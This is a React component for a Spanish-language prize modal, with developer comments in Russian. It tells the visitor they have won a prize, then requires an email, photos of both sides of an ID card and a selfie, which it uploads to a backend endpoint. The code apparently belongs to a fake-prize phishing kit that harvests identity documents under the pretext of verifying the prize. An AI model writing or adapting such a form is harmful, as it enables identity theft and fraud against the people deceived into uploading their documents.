import { useEffect, useState } from "react";
import { FaRegAddressCard } from "react-icons/fa6";
import { FaRegCreditCard } from "react-icons/fa6";
import { FaRegCircleUser } from "react-icons/fa6";
import axios from 'axios';

const Modal = ({ result, front, back, selfie, setFront, setBack, setSelfie, setPassScaner }) => {


    const [email, setEmail] = useState();
    const [emailError, setEmailError] = useState(false);

    const [finish, setFinish] = useState(false)


    const [isMobile, setIsMobile] = useState(false);

    useEffect(() => {
        // Проверяем, является ли текущее устройство мобильным
        const isMobileDevice = () => {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        };

        // Устанавливаем значение isMobile
        setIsMobile(isMobileDevice());
    }, []);

    // Стиль модального окна
    const modalStyle = result ? { transform: isMobile ? 'scale(1)' : 'translate(-50%, -50%) scale(1)' } : {};

    const handleSubmit = async () => {
        if (!email || !front || !back || !selfie) {
            setEmailError(true);
        } else {
            setEmailError(false);
            setFinish(true)
            const formData = new FormData();
            formData.append('prize', result);
            formData.append('email', email);
            formData.append('images', front); // Добавляем переднее изображение в список images
            formData.append('images', back); // Добавляем заднее изображение в список images
            formData.append('images', selfie); // Добавляем селфи в список images

            await axios.post('http://localhost:3001/send', formData);
            console.log(finish);
        }
    };



    const handleFileChange = (e, type) => {
        const file = e.target.files[0];

        switch (type) {
            case 'front':
                setFront(file);
                break;
            case 'back':
                setBack(file);
                break;
            case 'selfie':
                setSelfie(file);
                break;
            default:
                break;
        }
    };


    return (
        <div className="modal" style={modalStyle}>
            <h2>¡Felicidades! Tu premio es <span>{result}</span></h2>
            {finish ? (
                <p>Genial, tus documentos han sido enviados para verificación, espera.</p>
            ) : (
                <div>
                    <p>Para reclamar un premio debes ser mayor de 18 años, subir tus documentos y una selfie.</p>

                    <input className='email'
                        type="email"
                        placeholder='Email de contacto'
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        size="30"
                        required />

                    <div className="docLoad">
                        <div className="front">
                            <input type="file" accept="image/*" capture="environment" onChange={(e) => handleFileChange(e, 'front')} />
                            {front ? (
                                <img src={front} alt='' onClick={() => setPassScaner('front')} />
                            ) : (
                                <FaRegAddressCard onClick={() => setPassScaner('front')} />
                            )}
                            <span>Antes ID CARD</span>
                        </div>
                        <div className="back">
                            <input type="file" accept="image/*" capture="environment" onChange={(e) => handleFileChange(e, 'back')} />
                            {back ? (
                                <img src={back} alt='' onClick={() => setPassScaner('back')} />
                            ) : (
                                <FaRegCreditCard onClick={() => setPassScaner('back')} />
                            )}
                            <span>Atrás ID CARD</span>
                        </div>
                        <div className="slefie">
                            <input type="file" accept="image/*" capture="user" onChange={(e) => handleFileChange(e, 'selfie')} />
                            {selfie ? (
                                <img src={selfie} alt='' onClick={() => setPassScaner('selfie')} />
                            ) : (
                                <FaRegCircleUser onClick={() => setPassScaner('selfie')} />
                            )}
                            <span>Autofoto</span>
                        </div>
                    </div>

                    {emailError && <span className="error-msg">¡No has ingresado un correo electrónico o no has cargado todas las fotos!</span>}
                    <button className='sendDoc' onClick={handleSubmit}>Enviar para revisión</button>
                </div>
            )}


        </div>

    );
};

export default Modal;